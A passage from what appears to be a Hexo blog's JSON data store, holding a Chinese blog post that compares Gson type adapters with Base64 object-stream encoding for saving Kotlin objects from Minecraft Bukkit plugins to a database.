Bukkit.getWorld(a.asJsonObject.get(\"world\").asString),\n                a.asJsonObject.get(\"x\").asDouble,\n                a.asJsonObject.get(\"y\").asDouble,\n                a.asJsonObject.get(\"z\").asDouble,\n                a.asJsonObject.get(\"yaw\").asFloat,\n                a.asJsonObject.get(\"pitch\").asFloat\n            )\n        }\n    }\n\n\n```\n\n在GsonBuilder中注册类和Adapter后构造出来的Gson实例便可以序列化/反序列化对应的类\n\n操作算不上复杂，但也不算轻松\n\n对于只是想把实例存数据库的我来说，这些操作还是有些繁琐了\n\n所以，如果只是想把实例扔数据库里储存，使用**Base64**更加合适\n\n## Base64\n\nbase64不需要像gson那样做繁琐的操作，就可以对一个实例进行轻松的序列化/反序列化操作\n\n并且，在现有的Java版本中，使用Base64不再需要借助任何外部库\n\n**唯一的缺点是，它序列出来的字符串并不像Json字符串，可以用肉眼看出来其中蕴含的信息**\n\n但在数据库操作中，我们并不需要让用户知道这些字符的含义，并修改它们\n\n所以，用它序列化实例再扔进SQL实在是再合适不过了\n\n上代码\n\n```kotlin\n// 代码来自SacredHUD\n// Base64 encode\nfun HashMap<String, BitMapData.Personal>.toBase64(): String {\n    ByteArrayOutputStream().use { byteArrayOutputStream ->\n        BukkitObjectOutputStream(byteArrayOutputStream).use { bukkitObjectOutputStream ->\n            bukkitObjectOutputStream.writeObject(this)\n            return Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray())\n        }\n    }\n}\n\n// Base64 decode\n@Suppress(\"UNCHECKED_CAST\")\nfun String.base64ToBitmapData(): HashMap<String, BitMapData.Personal> {\n    ByteArrayInputStream(Base64.getDecoder().decode(this)).use { byteArrayInputStream ->\n        BukkitObjectInputStream(byteArrayInputStream).use { bukkitObjectInputStream ->\n            return bukkitObjectInputStream.readObject() as HashMap<String, BitMapData.Personal>\n        }\n    }\n}\n```","slug":"how-to-serialize","published":1,"updated":"2021-11-13T16:17:16.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jtj001fsfklbdd82igs","content":"<p>最常见的做法无非两种：序列化成<strong>json</strong>或者<strong>base64</strong></p>\n<h2 id=\"Json\"><a href=\"#Json\" class=\"headerlink\" title=\"Json\"></a>Json</h2><p>要将一个实例序列化成Json信息一般都需要借助<strong>外部库</strong></p>\n<p>比较常用的库有两种：谷歌的<strong>gson</strong>，阿里的<strong>fastjson</strong></p>\n<p>由于我接触的开发者们都比较青睐gson，而且Spigot核心甚至内置了一个gson库（虽然版本有点老了）</p>\n<p>所以对我个人而言，使用gson进行序列化操作更加容易</p>\n<p>只需要短短数行代码，便能轻松的序列化/反序列化一个实例</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 序列化实例</span>\n<span class=\"token keyword\">val</span> string<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 反序列化</span>\n<span class=\"token keyword\">val</span> obj<span class=\"token operator\">:</span> Any <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">,</span> Any<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 集合操作</span>\n<span class=\"token keyword\">val</span> str<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span><span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> list<span class=\"token operator\">:</span> ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span> <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span><span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> TypeToken<span class=\"token operator\">&lt;</span>ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">&gt;</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>但我最开始利用gson序列化的都是一些里面都塞的是原生数据类型的集合或者Map，所以理所当然的认为gson可以直接序列化所有类型的实例</p>\n<p>于是我吃了个大亏</p>\n<p>在尝试序列化我自己写的类实例化出来的实例时，我发现它们序列化出来都是{}，这导致了我之后反序列化操作造成的<strong>NullPointerException</strong></p>\n<p>要命的是，因为这个空指针，我各种检查自己的代码，检查到怀疑人生，所有的非空检测都做了，就还是会抛出这个异常</p>\n<p>说好的<strong>Kotlin</strong>干翻空指针呢！（笑）</p>\n<p>直到最后的最后，我检查了数据库中储存的序列化之后储存的数据，才发现这个错误</p>\n<p><strong>原来，Gson序列化自己建的类的实例，是需要做一些操作，将这些类注册到Gson实例中的</strong></p>\n<p>具体操作</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 代码来自 TabooLib io.izzel.taboolib.kotlin.Serializer</span>\n<span class=\"token comment\">// 注册对应类的TypeHierarchAdapter才能序列化这个类的实例</span>\n    <span class=\"token keyword\">val</span> gson <span class=\"token operator\">=</span> <span class=\"token function\">GsonBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setPrettyPrinting</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">excludeFieldsWithoutExposeAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">{</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>Location<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeLocation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>ItemStack<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeItemStack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>SecuredFile<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeSecuredFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>YamlConfiguration<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeYamlConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        SerializerAdapter<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">{</span> <span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token operator\">-&gt;</span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span>\n\n<span class=\"token comment\">// TypeAdapter</span>\n<span class=\"token comment\">// 这里以Location的TypeAdapter为例</span>\n    <span class=\"token keyword\">class</span> TypeLocation <span class=\"token operator\">:</span> JsonSerializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span> JsonDeserializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">:</span> Location<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonSerializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> JsonElement <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">JsonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">{</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>world<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>z<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>yaw<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>pitch<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">:</span> JsonElement<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token operator\">?</span><span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonDeserializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> Location <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">Location</span><span class=\"token punctuation\">(</span>\n                Bukkit<span class=\"token punctuation\">.</span><span class=\"token function\">getWorld</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asString<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asDouble<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat<span class=\"token punctuation\">,</span>\n                a<span class=\"token punctuation\">.</span>asJsonObject<span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>asFloat\n            <span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>在GsonBuilder中注册类和Adapter后构造出来的Gson实例便可以序列化/反序列化对应的类</p>\n<p>操作算不上复杂，但也不算轻松</p>\n<p>对于只是想把实例存数据库的我来说，这些操作还是有些繁琐了</p>\n<p>所以，如果只是想把实例扔数据库里储存，使用<strong>Base64</strong>更加合适</p>\n<h2 id=\"Base64\"><a href=\"#Base64\" class=\"headerlink\" title=\"Base64\"></a>Base64</h2><p>base64不需要像gson那样做繁琐的操作，就可以对一个实例进行轻松的序列化/反序列化操作</p>\n<p>并且，在现有的Java版本中，使用Base64不再需要借助任何外部库</p>\n<p><strong>唯一的缺点是，它序列出来的字符串并不像Json字符串，可以用肉眼看出来其中蕴含的信息</strong></p>\n<p>但在数据库操作中，我们并不需要让用户知道这些字符的含义，并修改它们</p>\n<p>所以，用它序列化实例再扔进SQL实在是再合适不过了</p>\n<p>上代码</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 代码来自SacredHUD</span>\n<span class=\"token comment\">// Base64 encode</span>\n<span class=\"token keyword\">fun</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">.</span><span class=\"token function\">toBase64</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> String <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> byteArrayOutputStream <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">BukkitObjectOutputStream</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> bukkitObjectOutputStream <span class=\"token operator\">-&gt;</span>\n            bukkitObjectOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getEncoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">encodeToString</span><span class=\"token punctuation\">(</span>byteArrayOutputStream<span class=\"token punctuation\">.</span><span class=\"token function\">toByteArray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token comment\">// Base64 decode</span>\n<span class=\"token annotation builtin\">@Suppress</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"UNCHECKED_CAST\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">fun</span> String<span class=\"token punctuation\">.</span><span class=\"token function\">base64ToBitmapData</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">ByteArrayInputStream</span><span class=\"token punctuation\">(</span>Base64<span class=\"token punctuation\">.</span><span class=\"token function\">getDecoder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">decode</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> byteArrayInputStream <span class=\"token operator\">-&gt;</span>\n        <span class=\"token function\">BukkitObjectInputStream</span><span class=\"token punctuation\">(</span>byteArrayInputStream<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">use</span> <span class=\"token punctuation\">{</span> bukkitObjectInputStream <span class=\"token operator\">-&gt;</span>\n            <span class=\"token keyword\">return</span> bukkitObjectInputStream<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HashMap<span class=\"token operator\">&lt;</span>String<span class=\"token punctuation\">,</span> BitMapData<span class=\"token punctuation\">.</span>Personal<span class=\"token operator\">&gt;</span>\n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":"前去拜访"},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in Go💕","url":"https://blog.stellaris.wang/","title":"前去拜访"}]}},"excerpt":"","more":"<p>最常见的做法无非两种：序列化成<strong>json</strong>或者<strong>base64</strong></p>\n<h2 id=\"Json\"><a href=\"#Json\" class=\"headerlink\" title=\"Json\"></a>Json</h2><p>要将一个实例序列化成Json信息一般都需要借助<strong>外部库</strong></p>\n<p>比较常用的库有两种：谷歌的<strong>gson</strong>，阿里的<strong>fastjson</strong></p>\n<p>由于我接触的开发者们都比较青睐gson，而且Spigot核心甚至内置了一个gson库（虽然版本有点老了）</p>\n<p>所以对我个人而言，使用gson进行序列化操作更加容易</p>\n<p>只需要短短数行代码，便能轻松的序列化&#x2F;反序列化一个实例</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 序列化实例</span>\n<span class=\"token keyword\">val</span> string<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span>instance<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 反序列化</span>\n<span class=\"token keyword\">val</span> obj<span class=\"token operator\">:</span> Any <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>string<span class=\"token punctuation\">,</span> Any<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">)</span>\n<span class=\"token comment\">// 集合操作</span>\n<span class=\"token keyword\">val</span> str<span class=\"token operator\">:</span> String <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">toJson</span><span class=\"token punctuation\">(</span><span class=\"token function\">arrayListOf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">val</span> list<span class=\"token operator\">:</span> ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span> <span class=\"token operator\">=</span> <span class=\"token function\">Gson</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">fromJson</span><span class=\"token punctuation\">(</span>str<span class=\"token punctuation\">,</span><span class=\"token keyword\">object</span> <span class=\"token operator\">:</span> TypeToken<span class=\"token operator\">&lt;</span>ArrayList<span class=\"token operator\">&lt;</span>String<span class=\"token operator\">></span><span class=\"token operator\">></span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span>type<span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n\n\n<p>但我最开始利用gson序列化的都是一些里面都塞的是原生数据类型的集合或者Map，所以理所当然的认为gson可以直接序列化所有类型的实例</p>\n<p>于是我吃了个大亏</p>\n<p>在尝试序列化我自己写的类实例化出来的实例时，我发现它们序列化出来都是{}，这导致了我之后反序列化操作造成的<strong>NullPointerException</strong></p>\n<p>要命的是，因为这个空指针，我各种检查自己的代码，检查到怀疑人生，所有的非空检测都做了，就还是会抛出这个异常</p>\n<p>说好的<strong>Kotlin</strong>干翻空指针呢！（笑）</p>\n<p>直到最后的最后，我检查了数据库中储存的序列化之后储存的数据，才发现这个错误</p>\n<p><strong>原来，Gson序列化自己建的类的实例，是需要做一些操作，将这些类注册到Gson实例中的</strong></p>\n<p>具体操作</p>\n<pre class=\"line-numbers language-kotlin\" data-language=\"kotlin\"><code class=\"language-kotlin\"><span class=\"token comment\">// 代码来自 TabooLib io.izzel.taboolib.kotlin.Serializer</span>\n<span class=\"token comment\">// 注册对应类的TypeHierarchAdapter才能序列化这个类的实例</span>\n    <span class=\"token keyword\">val</span> gson <span class=\"token operator\">=</span> <span class=\"token function\">GsonBuilder</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">setPrettyPrinting</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">excludeFieldsWithoutExposeAnnotation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">&#123;</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>Location<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeLocation</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>ItemStack<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeItemStack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>SecuredFile<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeSecuredFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>YamlConfiguration<span class=\"token operator\">::</span><span class=\"token keyword\">class</span><span class=\"token punctuation\">.</span>java<span class=\"token punctuation\">,</span> <span class=\"token function\">TypeYamlConfiguration</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        SerializerAdapter<span class=\"token punctuation\">.</span>map<span class=\"token punctuation\">.</span><span class=\"token function\">forEach</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span> <span class=\"token operator\">-></span>\n            it<span class=\"token punctuation\">.</span><span class=\"token function\">registerTypeHierarchyAdapter</span><span class=\"token punctuation\">(</span>k<span class=\"token punctuation\">,</span> v<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">.</span><span class=\"token function\">create</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!!</span>\n\n<span class=\"token comment\">// TypeAdapter</span>\n<span class=\"token comment\">// 这里以Location的TypeAdapter为例</span>\n    <span class=\"token keyword\">class</span> TypeLocation <span class=\"token operator\">:</span> JsonSerializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">></span><span class=\"token punctuation\">,</span> JsonDeserializer<span class=\"token operator\">&lt;</span>Location<span class=\"token operator\">></span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span>a<span class=\"token operator\">:</span> Location<span class=\"token punctuation\">,</span> p1<span class=\"token operator\">:</span> Type<span class=\"token punctuation\">,</span> p2<span class=\"token operator\">:</span> JsonSerializationContext<span class=\"token punctuation\">)</span><span class=\"token operator\">:</span> JsonElement <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token function\">JsonObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">also</span> <span class=\"token punctuation\">&#123;</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"world\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>world<span class=\"token operator\">!!</span><span class=\"token punctuation\">.</span>name<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"x\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>x<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"y\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>y<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"z\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>z<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yaw\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>yaw<span class=\"token punctuation\">)</span>\n                it<span class=\"token punctuation\">.</span><span class=\"token function\">addProperty</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"pitch\"</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">.</span>pitch<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">override</span> <span class=\"token keyword\">fun</span> <span class=\"token function\">deserialize</span><span class=\"token punctuation\">(</span>a<span class=\"token 